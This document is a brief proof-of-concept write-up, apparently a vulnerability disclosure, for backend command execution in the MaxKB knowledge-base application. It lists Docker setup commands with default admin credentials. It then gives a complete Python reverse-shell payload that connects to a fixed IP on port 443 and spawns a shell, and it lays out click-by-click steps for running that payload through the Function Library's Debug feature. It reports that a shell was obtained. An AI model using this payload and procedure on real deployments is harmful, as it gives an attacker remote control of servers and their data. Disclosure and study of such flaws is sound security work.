

**Maxkb Command Execution in Backend**

**Setup:**

```bash
# On Linux Machine
docker run -d --name=maxkb --restart=always -p 8080:8080 -v ~/.maxkb:/var/lib/postgresql/data -v ~/.python-packages:/opt/maxkb/app/sandbox/python-packages cr2.fit2cloud.com/1panel/maxkb

# On Windows Machine
docker run -d --name=maxkb --restart=always -p 8080:8080 -v C:/maxkb:/var/lib/postgresql/data -v C:/python-packages:/opt/maxkb/app/sandbox/python-packages cr2.fit2cloud.com/1panel/maxkb

# Username: admin
# Password: MaxKB@123..
```

**Payload:**

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.196.128",443))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty
pty.spawn("sh")
```

**Steps:**

1. Navigate to the "Function Library."
2. Click "Create Function."
3. Insert the payload into the function.
4. Click "Debug" and execute the function.

![img](file:///C:\Users\28162\AppData\Local\Temp\QQ_1737205693192.png)

**Result:**
A reverse shell was successfully obtained.

![img](file:///C:\Users\28162\AppData\Local\Temp\QQ_1737205774585.png)